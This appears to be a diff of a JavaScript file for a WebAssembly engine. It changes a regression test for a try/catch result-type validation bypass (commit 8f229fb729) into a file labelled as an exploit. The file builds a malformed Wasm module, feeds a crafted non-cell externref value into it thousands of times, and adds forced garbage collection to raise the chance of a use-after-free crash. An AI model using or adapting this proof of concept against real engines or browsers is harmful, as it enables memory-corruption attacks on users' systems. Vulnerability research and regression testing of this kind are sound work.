@@ -1,6 +1,4 @@
-// Phase B: 8f229fb729 — Wasm try/catch result-type validation bypass
-// Differential: pre-fix = module loads; post-fix = WebAssembly.CompileError
-
+// EXPLOIT: try/catch type confusion — 8f229fb729
 const bytes = new Uint8Array([
     0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
     0x01, 0x8c, 0x80, 0x80, 0x80, 0x00,
@@ -13,18 +11,18 @@ const bytes = new Uint8Array([
     0x00, 0x06, 0x6e, 0x20, 0x00, 0xfb, 0x1a, 0x07, 0x00,
     0x41, 0x01, 0xfb, 0x07, 0x00, 0x0b, 0xfb, 0x14, 0x6a, 0x0b,
 ]);
-
 try {
     const mod = new WebAssembly.Module(bytes);
-    print("VULNERABLE: module compiled successfully (validation bypass)");
+    print("STEP1_PASS: module compiled (validation bypass confirmed)");
     const instance = new WebAssembly.Instance(mod);
     const storage = new ArrayBuffer(8);
     const view = new DataView(storage);
     view.setBigUint64(0, 0x4141414141414141n - (1n << 49n), true);
     const nonCellExternref = view.getFloat64(0, true);
-    for (let i = 0; i < 10000; ++i)
+    // Force GC between iterations to increase UAF crash probability
+    for (let i = 0; i < 10000; ++i) {
         instance.exports.main(nonCellExternref);
-    print("DONE: survived 10000 iterations");
-} catch(e) {
-    print("FIXED or ERROR: " + e);
-}
+        if (i % 1000 === 999) gc();
+    }
+    print("STEP2_DONE: 10000 iterations survived");
+} catch(e) { print("ERROR: " + e); }
